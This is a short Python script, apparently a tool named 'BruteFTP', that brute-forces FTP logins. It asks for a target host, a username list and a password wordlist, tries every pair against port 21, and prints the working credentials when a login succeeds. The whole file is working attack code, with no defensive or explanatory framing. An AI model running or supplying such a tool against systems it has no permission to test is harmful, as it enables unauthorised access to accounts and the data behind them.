from ftplib import FTP
import sys

def ftp(target, username, password):
    try:
        ftp = FTP()
        ftp.connect(target, 21)
        ftp.login(username, password)
        print(f"[BruteFTP] {target}:21      - {target}:21 - Success: '{username}:{password}'")
        input()
        ftp.quit()
        sys.exit(0)
    except Exception:
        pass

def bruteforce(target, userlist, wordlist):
    try:
        for username in open(userlist, "r"):
            username = username.strip()
            for password in open(wordlist, "r"):
                password = password.strip()
                print(f"[BruteFTP] {target}:21      - {target}:21 - Failed: '{username}:{password}'")
                ftp(target, username, password)
    except FileNotFoundError as e:
        print(f"[BruteFTP] {target}:21      - {target}:21 - Error: '{e}'")


if __name__ == "__main__":
    target = input("[+] rhosts : ")
    userlist = input("[+] userlist : ")
    wordlist = input("[*] wordlist : ")
    print(f"[*] Running for {target}:21")
    bruteforce(target, userlist, wordlist)

    print(f"[-] [BruteDuck] {target}:21      - {target}:21 - PASS Error")
